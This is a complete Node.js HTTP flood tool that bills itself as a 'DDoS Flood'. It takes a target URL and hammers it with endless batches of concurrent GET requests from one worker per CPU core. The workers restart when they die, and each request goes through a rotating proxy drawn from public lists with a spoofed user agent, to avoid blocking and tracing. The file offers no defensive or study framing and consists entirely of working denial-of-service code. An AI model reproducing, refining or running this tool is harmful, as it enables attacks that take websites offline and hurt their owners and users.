const axios = require('axios');
const fakeUa = require('fake-useragent');
const cluster = require('cluster');
const HttpsProxyAgent = require('https-proxy-agent');
const os = require('os');

// Constants
const NUM_CPUS = os.cpus().length;
const REQUEST_TIMEOUT = 5000;
const PROXY_BATCH_SIZE = 1000;
const CONCURRENT_REQUESTS = 100;
const PROXY_REFRESH_INTERVAL = 60000; // 1 minute
const PROXY_SOURCES = [
  'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all',
  'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt',
  'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt',
  'https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt'
];

// Global variables
let proxies = [];
let targetUrl = '';
let mode = '';
let proxyRefreshAttempts = 0;
let isRefreshing = false;

async function loadProxies() {
  if (isRefreshing) return proxies; // Prevent multiple simultaneous refresh attempts
  
  isRefreshing = true;
  let loadedProxies = [];
  
  try {
    // Try each proxy source until we get a successful response
    for (const source of PROXY_SOURCES) {
      try {
        console.log(`Trying to fetch proxies from: ${source}`);
        const proxyResponse = await axios.get(source, {
          timeout: 10000
        });
        
        if (proxyResponse.data) {
          loadedProxies = proxyResponse.data
            .replace(/\r/g, '')
            .split('\n')
            .filter(proxy => proxy && proxy.includes(':'));
          
          console.log(`Successfully loaded ${loadedProxies.length} proxies from ${source}`);
          break; // Exit the loop if we successfully loaded proxies
        }
      } catch (error) {
        console.error(`Failed to fetch proxies from ${source}`);
      }
    }
  } catch (error) {
    console.error('Failed to fetch proxies from all sources');
  }
  
  isRefreshing = false;
  proxyRefreshAttempts++;
  
  if (loadedProxies.length === 0) {
    console.log(`No proxies loaded after ${proxyRefreshAttempts} attempts`);
    // If we've tried multiple times and still can't get proxies, switch to raw mode
    if (proxyRefreshAttempts >= 3) {
      console.log('Switching to raw mode due to proxy loading failures');
      mode = 'off';
    }
  } else {
    proxyRefreshAttempts = 0; // Reset attempts counter on success
  }
  
  return loadedProxies.length > 0 ? loadedProxies : proxies; // Return new proxies or keep old ones
}

function getRandomProxy() {
  if (proxies.length === 0) return null;
  return proxies[Math.floor(Math.random() * proxies.length)];
}

async function makeRequest(useProxy = false) {
  const config = {
    url: targetUrl,
    method: 'get',
    timeout: REQUEST_TIMEOUT,
    headers: {
      'Cache-Control': 'no-cache',
      'User-Agent': fakeUa(),
      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
      'Accept-Language': 'en-US,en;q=0.5',
      'Connection': 'keep-alive',
      'Upgrade-Insecure-Requests': '1'
    },
    validateStatus: function (status) {
      return true; // Always return true so we don't throw on non-200 status codes
    }
  };

  if (useProxy && proxies.length > 0) {
    const proxy = getRandomProxy();
    if (proxy) {
      try {
        config.httpsAgent = new HttpsProxyAgent('http://' + proxy);
        config.proxy = false; // Disable axios default proxy handling
      } catch (error) {
        // If there's an error with the proxy, continue without it
        console.log(`Invalid proxy: ${proxy}`);
      }
    }
  }

  try {
    const response = await axios(config);
    console.log(`Attack ${useProxy ? 'proxy' : 'raw'}: ${response.status}`);
    return true;
  } catch (error) {
    if (error.response) {
      console.log(`Attack ${useProxy ? 'proxy' : 'raw'}: ${error.response.status}`);
      return true;
    }
    
    // If we get here, it's likely a network error
    // Don't log these to avoid console spam
    return false;
  }
}

async function executeAttack() {
  const useProxy = mode === 'auto' && proxies.length > 0;
  
  // Create a pool of concurrent requests
  const requests = [];
  for (let i = 0; i < CONCURRENT_REQUESTS; i++) {
    requests.push(makeRequest(useProxy));
  }
  
  try {
    await Promise.allSettled(requests);
  } catch (error) {
    console.error('Error during attack execution:', error.message);
  }
  
  // Immediately schedule the next batch
  setImmediate(executeAttack);
}

async function refreshProxies() {
  if (mode === 'auto') {
    console.log('Refreshing proxy list...');
    const newProxies = await loadProxies();
    
    if (newProxies.length > 0) {
      proxies = newProxies;
      console.log(`Refreshed proxy list: ${proxies.length} proxies loaded`);
    } else if (proxies.length === 0) {
      console.log('No proxies available. Will try again later.');
    }
    
    // Schedule the next refresh regardless of success or failure
    setTimeout(refreshProxies, PROXY_REFRESH_INTERVAL);
  }
}

async function initialize() {
  console.log('╔═╗╔═╗╔═╗╦╔═╔═╗╔╦╗  ╔╗ ╦ ╦╔═╗╔═╗╔═╗╔═╗');
  console.log('╚═╗║ ║║  ╠╩╗║╣  ║   ╠╩╗╚╦╝╠═╝╠═╣╚═╗╚═╗');
  console.log('╚═╝╚═╝╚═╝╩ ╩╚═╝ ╩   ╚═╝ ╩ ╩  ╩ ╩╚═╝╚═╝');
  console.log('> DDoS Flood : Fixed Version <');
  
  if (process.argv.length !== 4) {
    console.log('Usage : node flood.js [url] [auto/off]');
    process.exit(1);
  }
  
  targetUrl = process.argv[2];
  mode = process.argv[3].toLowerCase();
  
  if (mode !== 'auto' && mode !== 'off') {
    console.log('Mode must be either "auto" or "off"');
    process.exit(1);
  }
  
  if (mode === 'auto') {
    console.log('Loading proxies...');
    proxies = await loadProxies();
    console.log(`Loaded ${proxies.length} proxies`);
    
    // Even if we couldn't load proxies, we'll start in auto mode
    // and the refreshProxies function will keep trying
    refreshProxies();
  }
  
  console.log(`Starting attack on ${targetUrl} in ${mode} mode`);
  console.log(`Using ${NUM_CPUS} CPU cores`);
  
  if (cluster.isMaster) {
    // Fork workers based on CPU count
    for (let i = 0; i < NUM_CPUS; i++) {
      cluster.fork();
      console.log(`WORKER ${i + 1} STARTED`);
    }
    
    cluster.on('exit', (worker, code, signal) => {
      console.log(`Worker ${worker.process.pid} died. Restarting...`);
      cluster.fork();
    });
  } else {
    // Workers execute the attack
    executeAttack();
  }
}

// Handle errors globally
process.on('uncaughtException', (err) => {
  // Log critical errors only
  if (err.code === 'ECONNRESET' || err.code === 'ETIMEDOUT') {
    return;
  }
  console.error('Uncaught exception:', err.message);
});

process.on('unhandledRejection', (reason) => {
  // Ignore common network errors
  if (reason.code === 'ECONNRESET' || reason.code === 'ETIMEDOUT') {
    return;
  }
  console.error('Unhandled rejection:', reason);
});

// Start the application
initialize();
